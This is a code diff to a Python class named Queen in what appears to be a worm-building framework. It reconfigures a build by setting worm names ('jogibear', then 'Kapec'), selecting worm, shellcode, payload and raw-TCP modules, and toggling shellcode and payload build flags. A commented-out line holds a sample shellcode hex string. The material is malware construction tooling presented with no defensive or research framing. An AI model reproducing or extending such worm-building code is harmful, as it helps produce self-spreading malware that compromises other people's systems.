@@ -80,18 +80,28 @@ class Queen:
 
 
 
-        conf["FLAG_NO_COMPILE"] = True
+        #conf["FLAG_NO_COMPILE"] = True
         # conf["BUILD_PAYLOAD"] = True
-        # conf["MODULE_INFO"] = "Big payload in python for test."
-        #conf["BUILD_SHELLCODE_PAYLOAD"] = True
+        # conf["MODULE_INFO"] = "big shellcode for anthill"
+        # conf["BUILD_SHELLCODE_PAYLOAD"] = True
         # conf["BUILD_SHELLCODE_FOOD"] = True
 
         # self.showItems("worm")
+        # self.setWormName("BigSC")
+        # self.addWormItem("worm", "WShellcode")
+        # self.addWormItem("scode", "PyYogi")
+        # self.addWormItem("payload", "BigMama")
 
-        self.setWormName("jogibear")
-        self.addWormItem("worm", "WShellcode")
-        self.addWormItem("scode", "PyYogi")
-        self.addWormItem("payload", "BigMama")
+        self.setWormName("Kapec")
+        self.addWormItem("worm", "Montezuma")
+        self.addWormItem("module", "PyRawTcp")
+        # self.addWormItem("payload", "pkppp")
+        #self.addWormItem("rscript", "BasicRes")
+        #self.addWormItem("payload", "BigSC")
+        # sc = "0x10, 0x03, 0x00, 0x00, 0x1a, 0x13, 0x14, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x0c"
+        # self.setVariable("SC_test", sc)
+        # self.addWormItem("scode", "PyYogi")
+        # self.addWormItem("payload", "BigMama")
         # self.addWormItem("module", "PyAnts")
         # self.setVariable("PYA_fext", "jpg, bmp")
         # self.addWormItem("module", "PyRawTcp")
